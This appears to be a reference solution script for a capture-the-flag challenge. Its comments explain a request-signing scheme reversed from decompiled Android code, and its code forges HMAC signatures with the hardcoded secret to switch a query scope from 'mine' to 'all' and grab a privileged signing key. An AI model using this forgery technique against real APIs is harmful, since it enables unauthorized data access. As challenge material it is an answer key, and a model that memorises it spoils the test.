#!/usr/bin/env python3
# Reference solution for "FleetLink".
#
# Every API call is signed. Reversing com/fleetlink/Signer.java (jadx) gives the whole
# scheme:
#   APP_SECRET   = "fleetlink_signing_pepper_v3"          (string literal)
#   key          = SHA256(APP_SECRET + ":" + deviceId)     (32 bytes)
#   canonical    = METHOD "\n" PATH "\n" sorted("k=v"&...) "\n" TS
#   X-Sig        = hex(HMAC-SHA256(key, canonical)),  headers X-Device-Id, X-Ts, X-Sig
#
# The signature covers the query params, so a captured request cannot be replayed with a
# different scope - you have to re-sign, which needs the scheme above. deviceId is
# attacker-chosen (the server derives the key from whatever X-Device-Id you send).
#
#   ./solve.py http://<host>:<port>
import sys, time, hmac, hashlib, json, urllib.request, urllib.error

APP_SECRET = "fleetlink_signing_pepper_v3"
BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8080").rstrip("/")


def call(path, params, device_id="attacker-device"):
    q = "&".join(f"{k}={v}" for k, v in sorted(params.items()))
    ts = str(int(time.time()))
    canonical = f"GET\n{path}\n{q}\n{ts}"
    key = hashlib.sha256((APP_SECRET + ":" + device_id).encode()).digest()
    sig = hmac.new(key, canonical.encode(), hashlib.sha256).hexdigest()
    url = f"{BASE}{path}" + (f"?{q}" if q else "")
    req = urllib.request.Request(url, headers={"X-Device-Id": device_id, "X-Ts": ts, "X-Sig": sig})
    try:
        return json.loads(urllib.request.urlopen(req).read())
    except urllib.error.HTTPError as e:
        return json.loads(e.read())


# the app only ever asks for scope=mine; the manifest tells you the privileged value
print("scope=mine:", call("/api/v1/fleet/manifest", {"scope": "mine"}))
res = call("/api/v1/fleet/manifest", {"scope": "all"})
print("FLAG:", res["dispatcher_manifest_signing_key"])
